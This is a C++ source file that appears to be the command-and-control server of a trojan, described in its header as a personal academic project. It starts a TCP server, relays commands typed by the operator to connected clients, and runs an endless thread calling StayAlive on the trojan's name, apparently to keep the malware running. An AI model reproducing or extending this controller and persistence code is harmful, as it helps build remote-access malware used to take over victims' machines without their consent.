// This is a personal academic project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++ and C#: http://www.viva64.com

#include "..\Service\pch.hpp"

#include "Server.hpp"
#include "..\Network\TCP\TCPServer.hpp"
#include "..\Network\UDP\UDPServer.hpp"
#include "..\Network\Protocols\CommandMessageProtocol.hpp"
#include "..\Service\Constants.hpp"
#include "..\Service\Log.hpp"
#include "..\Service\Debugger.hpp"
#include "..\Service\Tools.hpp"

/*************************************************************************************************************************************************************************************************************/
Server::Server() noexcept :
	m_io         { },
	m_tcp_server { nullptr },
	m_udp_server { nullptr },
	m_thread     { },
	m_save_thread{ }
{ }

/*************************************************************************************************************************************************************************************************************/
Server::~Server() noexcept = default;

/*************************************************************************************************************************************************************************************************************/
void Server::init(std::string_view port)
{
	m_tcp_server  = std::make_unique<TCPServer>(m_io, std::atoi(port.data()));
	///m_udp_server  = std::make_unique<UDPServer>(m_io, std::atoi(port.data()));
	m_thread      = std::thread{ [this]() { m_io.run(); } };
	m_save_thread = std::thread{ []() { for (;;) StayAlive(TROJAN_APP_NAME); } };
}

/*************************************************************************************************************************************************************************************************************/
void Server::run()
{
	std::string line;
	while (std::getline(std::cin, line))
	{
		std::string_view line_view{ line };
		if (auto length = line_view.length(); length >= CMPROTO::MAX_BODY_LENGTH)
		{
			LOG(warning) << "The command argument is very long. Data clipping";

			line_view.remove_suffix(length - CMPROTO::MAX_BODY_LENGTH);
		}

		std::unique_ptr<CMPROTO> msg{ std::make_unique<CMPROTO>() };
		msg->set_body_length(line_view.length());
		std::copy(std::execution::par_unseq, std::cbegin(line_view), std::cend(line_view), std::begin(msg->get_body()));

		msg->encode_header();

		m_tcp_server->write(std::move(msg));
	}
}

/*************************************************************************************************************************************************************************************************************/
void Server::close()
{
	m_tcp_server->close();

	m_thread.join();

	m_save_thread.join();
}
